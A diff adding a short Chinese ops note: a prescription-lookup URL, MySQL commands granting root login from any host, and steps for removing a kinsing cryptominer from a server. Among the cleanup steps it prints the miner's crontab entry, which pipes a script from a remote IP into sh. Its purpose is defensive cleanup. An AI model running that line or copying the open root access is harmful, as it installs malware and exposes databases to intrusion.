@@ -1,0 +1,41 @@
+访问方剂的方式：
+http://47.99.194.110/consilia/prescription/info?name=
+
+授权远程登陆服务器数据库
+mysql -u root -pvmwaremysql>use mysql;
+mysql>update user set host = '%' where user = 'root';
+mysql>select host, user from user;
+flush privileges;
+
+
+服务器挖矿木马清除
+
+1、top 找到主进程
+
+2、systemctl status 主进程
+
+3、kill -9 杀掉相关进程
+
+4、find / -name "kdevtmpfsi"  find / -name "kinsing" 删掉两个相关文件
+
+rm -rf /tmp/kdevtmpfsi
+
+rm -rf /var/tmp/kinsing 
+
+5、netstat -natp 查看异常ip 封禁！！！
+
+6、查看异常定时任务
+
+ crontab -l
+* * * * * wget -q -O - http://195.3.146.118/unk.sh | sh > /dev/null 2>&1
+删除
+
+crontab -e
+
+7、删除相关变种文件
+
+find / -name "kinsing*" | xargs rm -rf
+
+然后注意关闭ecs暴露的redis 此程序大都是因为redis漏洞引起：
+
+修改端口号、增加安全密码防止被扫描到
